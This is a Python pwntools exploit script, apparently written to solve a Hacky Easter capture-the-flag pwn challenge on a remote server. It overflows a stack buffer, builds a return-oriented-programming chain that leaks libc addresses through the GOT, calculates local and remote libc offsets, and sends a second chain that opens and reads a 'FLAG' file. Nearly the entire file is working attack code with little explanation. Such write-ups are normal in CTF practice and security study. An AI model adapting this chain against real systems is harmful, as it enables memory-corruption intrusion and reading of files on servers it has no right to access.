#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ch.hackyeaster.com --port 2314 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')
libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ch.hackyeaster.com'
port = int(args.PORT or 2314)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

"""
ropper --nocolor --file /usr/lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rax; ret;'                       

0x000000000003f0a7: pop rax; ret; 
0x00000000001346e6: pop rdi; ret;
0x0000000000028ed9: pop rsi; ret; 
0x00000000000fdc9d: pop rdx; ret; 
0x0000000000026428: syscall; 
"""


rop = ROP(exe)
rop.raw(cyclic(cyclic_find('kaaa', n=4), n=4))
rop.call(exe.symbols['puts'], [exe.got['puts']])
rop.call(exe.symbols['puts'], [exe.got['printf']])
rop.call(exe.symbols['puts'], [exe.got['gets']])
rop.call(exe.symbols['puts'], [exe.got['prctl']])
rop.call(exe.symbols['puts'], [exe.got['setbuf']])
rop.call(exe.symbols['main'])

# shellcode = asm(shellcraft.sh())
# rop.main()

io = start()
log.info(rop.dump())
io.sendline(rop.chain())
# get the leaked address of ASLR puts() in libc in the server
io.recvuntil(b"\n")
io.recvuntil(b": ")
tmp = io.recvuntil(b"\n").rstrip()
leaked_addr_puts_libc = u64(tmp.ljust(8, b"\x00"))
log.info("Leaked server's libc address, puts(): " + hex(leaked_addr_puts_libc))
leaked_addr_printf_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info("Leaked server's libc address, printf(): " + hex(leaked_addr_printf_libc))
leaked_addr_gets_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info("Leaked server's libc address, gets(): " + hex(leaked_addr_gets_libc))
leaked_addr_prctl_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info("Leaked server's libc address, prctl(): " + hex(leaked_addr_prctl_libc))
leaked_addr_setbuf_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info("Leaked server's libc address, setbuf(): " + hex(leaked_addr_setbuf_libc))

if args.LOCAL:
    """
    symbols from the local libc (identified from leaked addresses):

    open 00000000000f7d40  # this seems to be incorrect and should be d20...
    00000000000f7d20 <__open_2@@GLIBC_2.7>:

    read 00000000000f8020

    open 00000000000f7e00
    read 00000000000f80e0
    fopen 0000000000076170

    puts 0000000000077820
    printf 0000000000052450
    gets 0000000000076f30

    gadget for rdx from libc (ROPgadget):
    0x00000000000fdc9d: pop rdx; ret;
    0x00000000000352ec : mov qword ptr [rdx], rax ; ret
    """
    addr_printf = 0x52450
    addr_open = 0xf7d20 - addr_printf + leaked_addr_printf_libc
    addr_fopen = 0x76170 - addr_printf + leaked_addr_printf_libc
    addr_read = 0xf8030 -  addr_printf + leaked_addr_printf_libc
    pop_rdx_addr = 0xfdc9d  -  addr_printf + leaked_addr_printf_libc
    pop_rax_addr = 0x3f0a7  -  addr_printf + leaked_addr_printf_libc
    write_rdx_rax_addr = 0x352ec  -  addr_printf + leaked_addr_printf_libc

else:
    """
    symbols from the remote libc (identified from leaked addresses):
    open 000000000010fbf0
    read 0000000000110020

    printf 0000000000064e40

    gadget for rdx from libc (ROPgadget):
    0x0000000000001b96: pop rdx; ret;  
    0x000000000001b500: pop rax; ret; 
    0x000000000003099c : mov qword ptr [rdx], rax ; ret
    """
    addr_printf = 0x64e40
    addr_open = 0x10fbf0 - addr_printf + leaked_addr_printf_libc
    addr_read = 0x110020 -  addr_printf + leaked_addr_printf_libc

    pop_rdx_addr = 0x1b96  -  addr_printf + leaked_addr_printf_libc
    pop_rax_addr = 0x1b500  -  addr_printf + leaked_addr_printf_libc
    write_rdx_rax_addr = 0x3099c  -  addr_printf + leaked_addr_printf_libc

data_addr = p64(0x601030)

rop = ROP(exe)
from pwnlib.rop.rop import Gadget
# print(rop.rdi)
rop.gadgets[pop_rdx_addr] = Gadget(pop_rdx_addr,
    ['pop rdx', 'ret'], ['rdx'], 0x10)
rop.gadgets[pop_rax_addr] = Gadget(pop_rax_addr,
    ['pop rax', 'ret'], ['rax'], 0x10)
rop.gadgets[write_rdx_rax_addr] = Gadget(write_rdx_rax_addr,
    ['mov qword ptr [rdx], rax', 'ret'], ['[rdx]', 'rax'], 0x10)
# print(rop.rax)

rop.raw(cyclic(cyclic_find('kaaa', n=4), n=4))

rop(rdx=data_addr)
rop(rax=b'FLAG\x00$$$')
rop.call(write_rdx_rax_addr)
rop(rdi=data_addr)
rop.call(exe.symbols['puts'])
rop(rax=0x0)
rop(rdx=0x0)
rop(rsi=0x0)
rop(rdi=data_addr)
rop.call(addr_open)
for _ in range(5):
    rop(rdi=0x3)
    rop(rsi=data_addr)
    rop(rdx=0x30)
    rop.call(addr_read)
    rop(rdi=data_addr)
    rop.call(exe.symbols['puts']) 
# rop.call(exe.symbols['puts'], [data_addr]) 
rop.call(exe.symbols['main'])
# rop.raw(b'FLAG\x00$$$')
# rop.raw(b'FLAG01\x00$')
# rop.raw(b'FLAG02\x00$')
# rop.raw(b'FLAG03\x00$')
# rop.raw(b'FLAG04\x00$')
# rop.raw(b'FLAG05\x00$')
# rop.raw(b'FLAG06\x00$')
# rop.raw(b'FLAG07\x00$')
# rop.raw(b'FLAG08\x00$')
# rop.raw(b'FLAG09\x00$')
# rop.raw(b'./FLAG\x00$')
# rop.raw(b'./FLAG\x00$')
# rop.raw(b'         ./FLAG\x00$')

log.info(rop.dump())
io.sendline(rop.chain())
io.interactive()
print(io.readline())
print(io.readline())
print(io.readline())
print(io.readline())
print(io.readline())


